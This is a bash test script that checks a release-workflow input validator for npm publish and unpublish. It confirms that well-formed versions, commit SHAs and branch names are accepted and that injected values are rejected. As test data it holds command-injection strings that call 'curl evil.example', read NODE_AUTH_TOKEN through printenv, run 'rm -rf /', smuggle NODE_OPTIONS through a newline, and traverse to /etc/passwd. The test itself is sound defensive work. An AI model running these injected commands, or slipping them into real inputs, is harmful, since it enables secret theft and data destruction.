#!/usr/bin/env bash
# Exercises validate-release-input.sh's allowlists directly, so the
# publish/unpublish workflows' input validation can be checked locally
# and in CI without dispatching a real workflow or touching the npm
# registry. Run: bash .github/scripts/validate-release-input.test.sh
set -euo pipefail

cd "$(dirname "${BASH_SOURCE[0]}")"
SCRIPT=./validate-release-input.sh

pass=0
fail=0

assert_valid() {
  local kind="$1" value="$2"
  if "$SCRIPT" "$kind" "$value" >/dev/null 2>&1; then
    pass=$((pass + 1))
  else
    fail=$((fail + 1))
    echo "FAIL: expected '$value' to be a valid $kind"
  fi
}

assert_invalid() {
  local kind="$1" value="$2"
  if "$SCRIPT" "$kind" "$value" >/dev/null 2>&1; then
    fail=$((fail + 1))
    echo "FAIL: expected '$value' to be rejected as $kind"
  else
    pass=$((pass + 1))
  fi
}

# semver
assert_valid semver "0.56.7"
assert_valid semver "0.56.7-rc.12"
assert_invalid semver ""
assert_invalid semver "0.56.7; curl evil.example"
assert_invalid semver "\$(whoami)"
assert_invalid semver $'0.56.7-rc.1\nNODE_OPTIONS=--require=/tmp/x'

# semver-base
assert_valid semver-base "0.56.7"
assert_invalid semver-base "0.56.7-rc.1"
assert_invalid semver-base "latest"

# commit-sha
assert_valid commit-sha "a1b2c3d"
assert_valid commit-sha "a1b2c3d4e5f60718293a4b5c6d7e8f9a0b1c2d3"
assert_invalid commit-sha "main\"; echo pwned; \""
assert_invalid commit-sha "../../etc/passwd"
assert_invalid commit-sha "abc"

# branch-name
assert_valid branch-name "main"
assert_valid branch-name "feat/marie/sdk-1375-harden-publish-workflows"
assert_invalid branch-name "-rf /"
assert_invalid branch-name "main\" && curl evil.example \""
assert_invalid branch-name "\$(printenv NODE_AUTH_TOKEN)"

# rc-number
assert_valid rc-number "1"
assert_valid rc-number "42"
assert_invalid rc-number "1; rm -rf /"
assert_invalid rc-number "one"
assert_invalid rc-number "01"
assert_invalid rc-number "0"

# boolean
assert_valid boolean "true"
assert_valid boolean "false"
assert_invalid boolean "TRUE"
assert_invalid boolean "true; echo pwned"

# confirm
assert_valid confirm "CONFIRM"
assert_invalid confirm "confirm"
assert_invalid confirm "CONFIRM\" || npm publish \""

# unpublish-type
assert_valid unpublish-type "specific_version"
assert_valid unpublish-type "latest_rc"
assert_valid unpublish-type "all_rc_for_version"
assert_invalid unpublish-type "specific_version; rm -rf /"
assert_invalid unpublish-type "anything_else"

# unknown kind fails closed
assert_invalid made-up-kind "whatever"

echo ""
echo "$pass passed, $fail failed"
[ "$fail" -eq 0 ]
